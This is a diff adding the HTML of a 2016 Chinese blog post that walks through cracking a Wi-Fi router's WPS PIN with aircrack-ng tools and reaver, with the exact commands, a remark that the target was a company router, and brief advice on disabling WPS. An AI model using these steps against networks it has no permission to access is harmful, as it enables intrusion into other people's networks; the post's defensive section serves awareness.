@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html >
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Rancho" />
+
+
+
+<meta name="description" content="前言知识就是力量, 但是拥有力量不代表着可以为所欲为.在安全领域里, 没有挡不住的矛, 也没有攻不破的盾.并非信安大牛, 本文只是出于好奇和实验, 仅供学习和参考
+你知道的越多, 就越能保护好自己.
+准备工作像 Kali Linux 和 BackTrack 等发行版, 预装好了各种安全工具和软件包下文实际环境为 Arch, 对象是某公司的弱口令路由器…
+sudo pacman -S wireles">
+<meta property="og:type" content="article">
+<meta property="og:title" content="破解带WPA的WI-FI密码">
+<meta property="og:url" content="http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/index.html">
+<meta property="og:site_name" content="伯爵在古堡">
+<meta property="og:description" content="前言知识就是力量, 但是拥有力量不代表着可以为所欲为.在安全领域里, 没有挡不住的矛, 也没有攻不破的盾.并非信安大牛, 本文只是出于好奇和实验, 仅供学习和参考
+你知道的越多, 就越能保护好自己.
+准备工作像 Kali Linux 和 BackTrack 等发行版, 预装好了各种安全工具和软件包下文实际环境为 Arch, 对象是某公司的弱口令路由器…
+sudo pacman -S wireles">
+<meta property="og:image" content="http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/iwconfig.png">
+<meta property="og:image" content="http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/airmon-ng.png">
+<meta property="og:image" content="http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/airodump-ng.png">
+<meta property="og:image" content="http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/reaver.png">
+<meta property="og:image" content="http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/result.png">
+<meta property="og:updated_time" content="2016-10-01T04:52:33.823Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="破解带WPA的WI-FI密码">
+<meta name="twitter:description" content="前言知识就是力量, 但是拥有力量不代表着可以为所欲为.在安全领域里, 没有挡不住的矛, 也没有攻不破的盾.并非信安大牛, 本文只是出于好奇和实验, 仅供学习和参考
+你知道的越多, 就越能保护好自己.
+准备工作像 Kali Linux 和 BackTrack 等发行版, 预装好了各种安全工具和软件包下文实际环境为 Arch, 对象是某公司的弱口令路由器…
+sudo pacman -S wireles">
+<meta name="twitter:image" content="http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/iwconfig.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="伯爵在古堡" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.jpg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/green/pace-theme-center-atom.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>破解带WPA的WI-FI密码 | 伯爵在古堡</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?a368d89b0fb146bd737dc9e2c158260a";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Rancho</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">爱和死亡留给上帝。</p>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/about.html">古堡攻略</a></li>
+                        
+                            <li><a href="/archives">/*所有*/</a></li>
+                        
+                            <li><a href="/categories/随笔">/*随笔*/</a></li>
+                        
+                            <li><a href="/categories/札记">/*札记*/</a></li>
+                        
+                            <li><a href="/404.html">无疆之域</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/RanchoCooper" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/rancho-cooper" title="知乎"></a>
+                            
+                                <a class="fa 豆瓣" href="https://douban.fm/" title="豆瓣"></a>
+                            
+                                <a class="fa Email" href="mailto:ranchocooper@gmail.com" title="Email"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OGRE/">OGRE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hack-style/">hack-style</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/宗教/">宗教</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/建筑/">建筑</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/政治/">政治</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文明/">文明</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/法律/">法律</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编码/">编码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网络/">网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机体系/">计算机体系</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://segmentfault.com/">SegmentFault</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.codingpy.com/">编程派</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Rancho</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Rancho</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">爱和死亡留给上帝。</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/about.html">古堡攻略</a></li>
+                
+                    <li><a href="/archives">/*所有*/</a></li>
+                
+                    <li><a href="/categories/随笔">/*随笔*/</a></li>
+                
+                    <li><a href="/categories/札记">/*札记*/</a></li>
+                
+                    <li><a href="/404.html">无疆之域</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/RanchoCooper" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/rancho-cooper" title="知乎"></a>
+                            
+                                <a class="fa 豆瓣" target="_blank" href="https://douban.fm/" title="豆瓣"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:ranchocooper@gmail.com" title="Email"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-破解开启WPS的WIFI密码" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/07/29/破解开启WPS的WIFI密码/" class="article-date">
+      <time datetime="2016-07-29T05:44:06.000Z" itemprop="datePublished">2016-07-29</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      破解带WPA的WI-FI密码
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/札记/">札记</a><a class="article-category-link" href="/categories/札记/网络安全/">网络安全</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack-style/">hack-style</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>知识就是力量, 但是拥有力量不代表着可以为所欲为.<br>在安全领域里, 没有挡不住的矛, 也没有攻不破的盾.<br>并非信安大牛, 本文只是出于好奇和实验, 仅供学习和参考</p>
+<p>你知道的越多, 就越能保护好自己.</p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>像 <code>Kali Linux</code> 和 <code>BackTrack</code> 等发行版, 预装好了各种安全工具和软件包<br>下文实际环境为 <code>Arch</code>, 对象是某公司的弱口令路由器…</p>
+<pre><code>sudo pacman -S wireless_tools
+sudo pacman -S aircrack-ng
+sudo pacman -S reaver
+</code></pre><p>好了, 工具具备, 只欠东风.<br>接下来就正式体验一番黑客入侵的感觉</p>
+<a id="more"></a>
+<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><h3 id="搜集设备信息"><a href="#搜集设备信息" class="headerlink" title="搜集设备信息"></a>搜集设备信息</h3><pre><code>iwconfig
+</code></pre><p>图中 wlp3s0 是我的无线网卡名称, 不过一般机子都叫 <code>wlan0</code>, 而 <code>enp</code> 那个则是以太网网卡<br>随后则是一些网卡信息说明</p>
+<img src="/2016/07/29/破解开启WPS的WIFI密码/iwconfig.png" alt="iwconfig" title="iwconfig">
+<h3 id="将无线网卡设置为监控模式"><a href="#将无线网卡设置为监控模式" class="headerlink" title="将无线网卡设置为监控模式"></a>将无线网卡设置为监控模式</h3><pre><code>sudo airmon-ng start wlan
+</code></pre><p>开启监控之后, 就会处于离线状态(如果之前连接的是无线网络)<br>wlan是刚才提到的网卡名称, 开启监控模式后会加上mon的后缀<br>后面再用到这张网卡的时候就要用这个带后缀的名字, 如图中高亮部分</p>
+<img src="/2016/07/29/破解开启WPS的WIFI密码/airmon-ng.png" alt="airmon-ng" title="airmon-ng">
+<h3 id="获取路由器的唯一标识"><a href="#获取路由器的唯一标识" class="headerlink" title="获取路由器的唯一标识"></a>获取路由器的唯一标识</h3><p>开启监控之后, 我们就要获取相应WIFI的”Mac地址了”<br>实际上就是对应路由器的一个标识, 唯一的身份证(BSSID)<br>这时候会动态地扫描周围的无线信号, <code>&lt;ctrl-c&gt;</code> 结束扫描</p>
+<pre><code>sudo airodump-ng wlan-mon
+</code></pre><p>最右侧一栏里的 <code>ESSID</code>, 就是平常我们看见的WIFI名称(中文乱码无视就好)<br>假设图中高亮的就是我们要破解的WIFI<br>那么就需要用到它的身份证, BSSID</p>
+<img src="/2016/07/29/破解开启WPS的WIFI密码/airodump-ng.png" alt="airodump-ng" title="airodump-ng">
+<p>当然也可以过滤出支持WPS的AP</p>
+<pre><code>wash -i wlan1mon -C
+</code></pre><h3 id="Reaver破解"><a href="#Reaver破解" class="headerlink" title="Reaver破解"></a>Reaver破解</h3><p>现在我们就开始破解相应的WIFI了<br>bssid从上面复制过来</p>
+<pre><code>sudo reaver -i wlanmon -b bssid -vv
+</code></pre><img src="/2016/07/29/破解开启WPS的WIFI密码/reaver.png" alt="reaver" title="reaver">
+<p>WIFI信号越强, 接下来花费的时间就越短(当然和实际信道占用情况也有关系)</p>
+<pre><code>reaver -i wlan1mon -b MAC -a -S -vv -d0 -c 1
+</code></pre><p>然后你的工作就是喝喝茶, 听首歌, reaver官方文档说这个过程用时在5-10小时</p>
+<p>而实测的无线网络只花了两小时</p>
+<img src="/2016/07/29/破解开启WPS的WIFI密码/result.png" alt="reaver" title="reaver">
+<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>reaver也并不是无坚不摧, 它的工作原理实际上就是利用了路由设备的WPS (WIFI保护设置) 中PIN码的一个漏洞, 并尝试一系列PIN码来暴力破解, 期间可能出现的超时, 中断, PIN码死循环等问题, reaver都会一一处理. 那如果路由本身没有开启WPS, 那就无法入侵咯</p>
+<p><strong>所以自己家里的无线设备一定要把这个保护机制给关了</strong></p>
+<h2 id="安全防范"><a href="#安全防范" class="headerlink" title="安全防范"></a>安全防范</h2><p>但关闭WPS也并非一劳永逸, 肯花心思的人还是可以黑进来的.<br>通常来将通过路由器过滤Mac地址的方式可以避免绝大部分的恶意入侵<br>除非你遇到了黑客高手, 获取到白名单并用假冒的MAC地址来访问你的网络</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/07/29/破解开启WPS的WIFI密码/">破解带WPA的WI-FI密码</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Rancho</a></p>
+        <p><span>发布时间:</span>2016-07-29, 13:44:06</p>
+        <p><span>最后更新:</span>2016-10-01, 12:52:33</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/07/29/破解开启WPS的WIFI密码/" title="破解带WPA的WI-FI密码">http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/</a>
+            <span class="copy-path" data-clipboard-text="原文:  http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/　　作者:  Rancho" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> 转载注明作者及原始链接
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/09/01/凌晨两点/">
+                    凌晨两点
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/07/27/Arch不只是初恋/">
+                    Arch: 不只是初恋
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#准备工作"><span class="toc-number">2.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开始破解"><span class="toc-number">3.</span> <span class="toc-text">开始破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#搜集设备信息"><span class="toc-number">3.1.</span> <span class="toc-text">搜集设备信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将无线网卡设置为监控模式"><span class="toc-number">3.2.</span> <span class="toc-text">将无线网卡设置为监控模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取路由器的唯一标识"><span class="toc-number">3.3.</span> <span class="toc-text">获取路由器的唯一标识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reaver破解"><span class="toc-number">3.4.</span> <span class="toc-text">Reaver破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工作原理"><span class="toc-number">4.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安全防范"><span class="toc-number">5.</span> <span class="toc-text">安全防范</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-6 i,
+        .toc-level-6 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2016/07/29/破解开启WPS的WIFI密码/" data-title="破解带WPA的WI-FI密码" data-url="http://rancho1110.com/2016/07/29/破解开启WPS的WIFI密码/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"rancho1110"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/09/01/凌晨两点/" title="上一篇: 凌晨两点">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/07/27/Arch不只是初恋/" title="下一篇: Arch: 不只是初恋">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/10/01/伙伴分配器的极简实现/">伙伴分配器的极简实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/28/宏孩儿的前世今生/">宏孩儿的前世今生</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/21/函数式编程/">函数式编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/20/Python进阶之旅/">Python进阶之旅</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/01/凌晨两点/">凌晨两点</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/29/破解开启WPS的WIFI密码/">破解带WPA的WI-FI密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/27/Arch不只是初恋/">Arch: 不只是初恋</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/26/Python杂症之编码/">Python杂症之编码</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/01/优雅玩转Linux/">优雅玩转Linux</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/22/中西方建筑特征/">中西方建筑特征</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/22/西方私法文明/">西方私法文明</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/19/网络编程基础/">网络编程基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/19/西方政治文明/">西方政治文明</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/13/运行时环境/">运行时环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/07/西方文明概说/">西方文明概说</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/04/文明的内涵/">文明的内涵</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/30/计算机系统漫游/">计算机系统漫游</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/编译原理之概论/">编译原理之概论</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/07/ORGE引擎编译及配置/">ORGE引擎编译及配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/hexo常用命令/">Hexo常用命令</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i>
+                2016 Rancho
+            </div>
+            <div class="footer-right">
+                Powered By <a href="http://hexo.io/" target="_blank" title="Powerful Blog Framework">Hexo</a>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_pv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 14;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+            
+            
+            
+            
+            
+            
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂)" + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*)" + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    bp.src = '//push.zhanzhang.baidu.com/push.js';
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+  </div>
+</body>
+</html>
